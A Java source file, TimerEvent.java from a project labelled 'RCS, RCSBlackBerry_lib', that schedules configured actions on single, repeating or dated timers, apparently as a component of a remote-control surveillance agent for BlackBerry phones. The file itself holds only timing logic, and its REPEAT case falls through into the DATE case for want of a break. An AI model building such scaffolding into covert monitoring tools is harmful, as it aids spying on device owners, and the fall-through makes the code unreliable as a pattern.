/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : TimerEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import java.io.EOFException;
import java.util.Date;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.Conf;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class TimerEvent extends Event {
    private static final int SLEEP_TIME = 1000;

    private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);

    int type;
    long lo_delay;
    long hi_delay;

    Date timestamp;

    public TimerEvent(int actionId, byte[] confParams) {
        super(Event.EVENT_TIMER, actionId, confParams);
    }

    public TimerEvent(int actionId, int type, int lo_delay, int hi_delay) {
        super(Event.EVENT_TIMER, actionId);
        this.type = type;
        this.lo_delay = lo_delay;
        this.hi_delay = hi_delay;
    }

    protected boolean Parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            this.type = databuffer.readInt();
            this.lo_delay = databuffer.readInt();
            this.hi_delay = databuffer.readInt();

            debug
                    .trace("type: " + type + " lo:" + lo_delay + " hi:"
                            + hi_delay);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

    protected void EventRun() {
        debug.trace("EventRun");
        Check.requires(statusObj != null, "StatusObj NULL");
        timestamp = new Date();
        Date now;
        long wait;
        
        for (;;) {
            switch (this.type) {
                case Conf.CONF_TIMER_SINGLE:
                    debug.trace("TIMER_SINGLE");

                    wait = lo_delay;
                    now = new Date();

                    /*
                     * debug.trace("now:"+now.getTime());
                     * debug.trace("timestamp:"+timestamp.getTime());
                     * debug.trace("diff:"+ (now.getTime() -
                     * timestamp.getTime())+" wait:"+wait);
                     */
                    if (now.getTime() - timestamp.getTime() > wait) {
                        debug.trace("triggering:" + ActionId);
                        statusObj.TriggerAction(ActionId);
                        Stop();
                        return;
                    }

                    break;
                case Conf.CONF_TIMER_REPEAT:
                    debug.trace("TIMER_REPEAT");

                    wait = lo_delay;
                    now = new Date();

                    if (now.getTime() - timestamp.getTime() > wait) {
                        timestamp = now;
                        statusObj.TriggerAction(ActionId);
                    }
                case Conf.CONF_TIMER_DATE:
                    debug.trace("TIMER_DATE");

                    long tmpTime = (long) hi_delay << 32;
                    tmpTime += lo_delay;

                    Date tmpDate = new Date(tmpTime);
                    debug.trace(tmpDate.toString());

                    now = new Date();

                    if (now.getTime() > tmpTime) {
                        statusObj.TriggerAction(ActionId);
                        Stop();
                        return;
                    }

                    break;
                case Conf.CONF_TIMER_DELTA:
                    // TODO: da implementare
                    debug.trace("TIMER_DELTA");
                    break;
                default:
                    debug.error("shouldn't be here");
                    break;
            }

            if (EventSleep(SLEEP_TIME)) {
                debug.trace("EventSleep exit");
                return;
            }
        }
    }

}
